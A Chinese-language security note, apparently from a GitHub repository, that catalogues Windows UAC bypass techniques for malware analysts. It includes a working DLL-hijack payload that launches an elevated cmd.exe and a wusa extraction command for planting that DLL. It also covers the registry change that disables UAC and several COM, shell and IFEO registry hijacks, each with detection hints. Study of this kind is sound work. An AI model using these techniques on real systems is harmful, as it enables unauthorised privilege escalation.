[TOC]

# UACBypass 整理

### 先来讲讲之前病毒里遇到的 通过.NET劫持Ole32.dll

- 首先查看`mmc gpedit.msc`的运行过程截图

- 可以发现有明显的两个相同`old32.dll`的调用均为找到![image-20210311115225656](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210311115225656.png)

- 既然失败了那就放两个进去让他调用![image-20210312152415592](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210312152415592.png)

  ```C++
  // DLL 代码
  BOOL APIENTRY DllMain(HMODULE hModule,
  	DWORD  ul_reason_for_call,
  	LPVOID lpReserved
  )
  {
  	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
  	switch (ul_reason_for_call)
  	{
  	case DLL_PROCESS_ATTACH:
  
  	case DLL_THREAD_ATTACH:
  		sei.fMask = SEE_MASK_NOCLOSEPROCESS;
  		sei.lpVerb = TEXT("runas");
  		sei.lpFile = TEXT("cmd.exe");
  		sei.lpDirectory = TEXT("c:\\Windows\\system32\\");
  		sei.nShow = SW_SHOWNORMAL;
  		if (!ShellExecuteEx(&sei))
  		{
  			DWORD dwStatus = GetLastError();
  		}
  	case DLL_THREAD_DETACH:
  	case DLL_PROCESS_DETACH:
  		break;
  	}
  	return TRUE;
  }
  ```

- 成功启动管理员cmd![image-20210312152834847](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210312152834847.png)

- 但是这里就产生了一个问题，就是`%windir%`的目录下，复制进去是需要管理员权限的，那不就死循环了么？

- 没事，还有 ==**白名单机制**== 

#### 使用wusa的白名单BypassUAC

  - 白名单大概有哪些呢：`slui.exe`、`wusa.exe`、`taskmgr.exe`、`msra.exe`、`eudcedit.exe`、`eventvwr.exe`、`CompMgmtLauncher.exe`，`rundll32.exe`，`explorer.exe`……

  - 这里我们要用到的是`wusa.exe`

  - 我们来看一下微软官方对这个程序的解释及说明：
  
    - 本文介绍了 Windows 操作系统中 Windows 更新独立安装程序 (Wusa.exe)：![image-20210312161519039](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210312161519039.png)
    - 那么msu又是什么呢：![image-20210312161543472](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210312161543472.png)
  - 那么其中cab又是什么呢：![image-20210312161619088](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210312161619088.png)
    
- 那`.cab`文件能不能自己压缩一个呢？可以✔![image-20210312161740398](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210312161740398.png)`makecab {dllName}`
  
  - 然后我们将`cab`直接改名为`msu`之后调用`wusa.exe`，那么怎么用呢？![image-20210312161943875](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210312161943875.png)
	
	- 那显然是这样：
		```
		wusa ole32.msu /extract:%windir%\Microsoft.NET\Framework\v2.0.50727
		```
		
	- 好的完成✔![image-20210312163004279](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210312163004279.png)请注意！全程都在普通权限命令行下完成，并且没有提示UAC，之后我们运行`mmc gpedit.msc`
	
- 再请注意，再W10中其实已经抛弃了wusa的`/extract`命令，所以W10下可能不可行，但是白名单也可以用进程伪装的方式实现。

#### 其他利用白名单BypassUAC

  - 通过修改PEB中描述进程信息的`ProcessParameters`中的`ImagePathName`和`CommandLine`(PSAPI使用`CommandLine`识别进程)

      - 具体可以看到[Gality的文章->BypassUAC原理及方法汇总](https://www.anquanke.com/post/id/216808#h3-5)

  - 可以劫持的DLL其实有很多，其中就包括`ole32.dll`和上面那篇文章中刚提到的`UACME`中用过的`cliconfg.exe`调用的`ntwdblib.dll`等等

  - 另外还有文章中介绍的`UACME`用到的使用`manifest`的方法等

- 那既然在W10下wusa被废了，W10怎么办呢。

### 利用IFileOperation越权复制后进行dll劫持

- COM组件`IFileOperation`越权复制

- 好了，又是前人的肩膀：三种实现思路
  1. DLL劫持或注入
  2. 修改PEB结构欺骗PSAPI后调用
  3. 通过可信文件直接调用
  - 说白了就是要`让PSAPI认为可信`

- 前面的实现就不讲了，包括DLL注入和修改PEB结构，我们来看一下获取可信后的操作。

  > 这里只放一下代码的调用顺序。因为这篇文章也主要是为了病毒分析时看到关于UACBypass的能看的出来，否则云里雾里，查很久。
  >
  > DLL注入可信进程后调用IFileOperation的代码可以自习这里：https://github.com/hjc4869/UacBypass

  ```C++
  DLLMain()/*内部*/ -> CoInitializeEx() -> CoCreateInstance() -> 
  fileOperation.SetOperationFlags() -> 
  // SHCreateItemFromParsingName(nowPath) -> 
  // SHCreateItemFromParsingName(destPath) -> 
  fileOperation.CopyItem() -> 
  fileOperation.PerformOperations() ->
  // 清理相关
  ```

- 而使用`Powershell`的方法是通过使用C#编译一个用于调用`IFileOperation`的COM组件后使用Powershell加载这个COM。具体代码可以参考文后链接

### 直接关闭UAC

> 这个操作有个问题，就是需要重启才能生效。

- 主要利用`IScurityEditor COM`对象，类似于`IFileOperation`两者同样是自动提升，并且应该位于白名单，**并且其作用在于可以修改注册表的访问权限。**

- 我们需要设置用于关闭UAC的注册表键值为：

  ```
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA -> 0 为关闭UAC
  ```

    ![image-20210316094009204](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210316094009204.png)
  
  ```C++
  // UACME的代码调用流程大概为:
  ucmMasqueradedAlterObjectSecurityCOM(); // 更改权限(此函数为UACme的自带函数，并非系统API所以应该没有符号) ->
  // RtlSecureZeroMemory(); /*->*/ RtlInitUnicodeString(); //->
  NtOpenKey(); /*->*/ NtSetValueKey();// 更改键值
  // 清理相关
  // 主要通过修改的注册表键值EnableLUA的特征来判断
  // 在Win10 TH1(10147)修复
  ```
  
### 利用带有自动提升COM组件的ShellExec

> 这个操作有两个关系到COM组件的前提：
>
> | 1    | 带有自动提升Auto Approval |
> | ---- | ------------------------- |
> | 2    | 调用了ShellExecuteEx      |

  具体的查找方法可以使用`Gality`提供的使用`OleViewDotNet`的[方法](https://www.anquanke.com/post/id/216808#h3-6)

大概的API调用流程为:

```C++
// 白名单伪装后
CoInitializeEx(); /*->*/ CoGetObject(); /*->*/ ShellExec();
// 清理相关
```



### 劫持带有权限的COM组件

> 主要使用的依旧是注册表键值，关系到两个键：
>
> | InprocServer32  | 注册32位进程所需要的模块、线程属性配置 |
> | --------------- | -------------------------------------- |
> | InprocHandler32 | 指定应用程序使用自定义处理程序         |

- 大多使用`InprocServer32`

```C++
// 使用格式为
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID
   {CLSID}
      InprocServer32
         (Default) = dllPath
         ThreadingModel = value

value:
| Apartment	| Single-threaded apartment
| Both		| Single-threaded or multithreaded apartment
| Free		| Multithreaded apartment
| Neutral	| Neutral apartment
// 可以通过RegCreateKeyEx的API调用修改CLSID\InprocServer32的特征来判断
// 在Win10 19H1(18362)修复
```

### 利用Shell API

  主要原理为修改有自动提升权限的软件的注册表的`shell\open\command`值

> 以达到在软件运行时附加运行指令的目的
>
> // 在Win10 TH1(10147)修复

- 可以通过修改注册表键值`HKEY_CURRENT_USER\Software\Classes\xxxx\Shell\open\command`的特征来判断



### 通过注册表指定程序加载DLL

> 同样需要通过`ISecurityEditor`来获得修改注册表的权限
>
> // 在Win10 TH1(10147)修复

- 修改注册表的位置为：`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`

  同样可以通过注册表路径特征判断可能行为

### 其他方法

#### 利用odbcad32.exe 的手动绕过UAC(意义不大)

- 使用`win+R`填入`odbcad32`启动ODBC数据源管理程序

- 选择`跟踪`标签页![image-20210316110312774](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210316110312774.png)

- 点击“浏览”按钮

- 在顶部输入`cmd.exe`并回车![image-20210316110553226](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210316110553226.png)

- 即可获得管理员CMD![image-20210316110613242](https://github.com/XforsecW12Lab/UACBypassSet/blob/main/Images/image-20210316110613242.png)

  

### 工具

- 寻找拥有自动提升权限的程序的工具：`Sigcheck.exe`和`Strings.exe`
  - `sigcheck.exe -m C:\Windows\System32\cmd.exe`
    - https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck
  - `strings.exe -s *.exe | findstr /i autoelevate`
    - https://docs.microsoft.com/en-us/sysinternals/downloads/strings

- 判断已经运行的程序的权限：powershell脚本`Get-TokenPrivs`
  - https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-TokenPrivs.ps1



> 参考：
>
> hfiref0x/UACME: [github.com](https://github.com/hfiref0x/UACME)                                                                          
>
> 红队分享-如何挖掘Windows Bypass UAC（第一课[payloads.online](https://payloads.online/archivers/2020-03-02/2)
>
> DLL Hijacking & COM Hijacking ByPass UAC [payloads.online](https://payloads.online/archivers/2018-12-22/1#0x00-前言)
>
>
> Windows 2019 Bypass (UAC、Defender) to Metasploit [payloads.online](https://payloads.online/archivers/2019-01-26/1)
> 
>
> UAC 攻击剖析[seebug.org](https://paper.seebug.org/127/)
> 
>
> BypassUAC原理及方法汇总[anquanke.com](https://www.anquanke.com/post/id/216808)
>
>
> 通过COM组件IFileOperation越权复制文件[github.io](https://3gstudent.github.io/3gstudent.github.io/通过COM组件IFileOperation越权复制文件/)
>
>
> DefCon25/DefCon25_UAC-0day-All-Day_v1.2.pdf[github.com](https://github.com/FuzzySecurity/DefCon25/blob/master/DefCon25_UAC-0day-All-Day_v1.2.pdf)
